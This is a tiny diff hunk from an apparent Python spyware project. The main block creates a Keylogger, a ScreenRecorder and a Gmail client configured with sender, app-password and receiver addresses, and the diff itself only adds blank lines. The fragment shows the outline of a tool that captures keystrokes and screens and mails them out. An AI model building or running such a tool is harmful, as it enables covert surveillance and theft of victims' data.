@@ -9,3 +9,6 @@ if __name__ == "__main__":
     keylogger = Keylogger()
     screen_recorder = ScreenRecorder()
     gmail = Gmail(os.getenv("SENDER_MAIL"), os.getenv("APP_PASSWORD"), os.getenv("RECEIVER_MAIL"))
+
+
+
